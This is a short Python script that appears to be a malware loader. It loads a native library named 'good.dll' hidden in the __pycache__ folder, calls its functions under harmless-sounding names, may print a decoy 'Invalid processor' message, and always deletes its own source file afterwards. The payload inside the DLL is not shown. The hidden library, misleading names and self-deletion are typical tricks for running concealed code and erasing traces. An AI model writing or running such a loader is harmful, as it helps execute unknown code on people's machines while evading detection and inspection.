import os, ctypes

def BuildingTheFoudation():
	try:
		Communication = ctypes.CDLL("./__pycache__/good.dll")
		IsNotOlderOS = Communication.IsNotOlderOS("x16bitOSplatform".encode("utf-8"))
		if IsNotOlderOS:
			None
		else:
			Communication.SettingCurrentVersion()
			if Communication.isSupported():
				print(f"Invalid processor")
			return
	finally:
		os.remove(__file__)


BuildingTheFoudation()
